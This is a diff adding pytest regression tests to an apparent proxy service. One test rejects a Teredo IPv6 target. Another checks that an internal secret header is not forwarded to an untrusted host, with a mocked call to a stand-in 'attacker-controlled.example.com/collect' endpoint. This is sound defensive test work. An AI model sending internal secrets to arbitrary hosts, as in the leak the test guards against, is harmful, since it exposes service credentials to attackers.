@@ -93,6 +93,12 @@ def test_validate_target_rejects_6to4():
         validate_target_url("https://[2002::1]/api")
 
 
+def test_validate_target_rejects_teredo():
+    """2001::/32 — Teredo tunneling, embeds server + client IPv4."""
+    with pytest.raises(ProxyError):
+        validate_target_url("https://[2001::1]/api")
+
+
 def test_validate_target_allows_public_ip():
     """Public IPs must remain reachable."""
     url = validate_target_url("https://8.8.8.8/api")
@@ -503,6 +509,45 @@ async def test_execute_proxy_extra_headers_blocks_internal_secret(test_api_key):
 
     # The real INTERNAL_SECRET may or may not be set, but "INJECTED" must never appear
     assert captured_headers.get("X-Internal-Secret") != "INJECTED"
+
+
+@pytest.mark.asyncio
+async def test_execute_proxy_internal_secret_not_forwarded_to_untrusted_target(test_api_key):
+    """X-Internal-Secret must NOT be forwarded to a target outside TRUSTED_INTERNAL_HOSTS,
+    even when INTERNAL_SECRET is configured (regression for 2026-09-11 leak: any HTTPS
+    target passed validate_target_url() used to receive this header unconditionally)."""
+    add_credits(test_api_key, 10.00, "pi_test_untrusted_secret")
+
+    captured_headers = {}
+
+    async def mock_post(url, json=None, headers=None, **kwargs):
+        captured_headers.update(headers or {})
+        mock_resp = MagicMock()
+        mock_resp.status_code = 200
+        mock_resp.json.return_value = {"ok": True}
+        mock_resp.headers = {}
+        return mock_resp
+
+    mock_client = AsyncMock()
+    mock_client.post = mock_post
+    mock_client.__aenter__ = AsyncMock(return_value=mock_client)
+    mock_client.__aexit__ = AsyncMock(return_value=None)
+
+    with patch("httpx.AsyncClient", return_value=mock_client), \
+         patch("trust_layer.proxy.INTERNAL_SECRET", "supersecret"), \
+         patch("trust_layer.proxy.TRUSTED_INTERNAL_HOSTS", {"trusted-internal.example.com"}), \
+         patch("trust_layer.proxy._post_proof_background", new_callable=AsyncMock):
+
+        await execute_proxy(
+            target="https://attacker-controlled.example.com/collect",
+            method="POST",
+            payload={},
+            amount=PROOF_PRICE,
+            currency="eur",
+            api_key=test_api_key,
+        )
+
+    assert "X-Internal-Secret" not in captured_headers
 
 
 @pytest.mark.asyncio
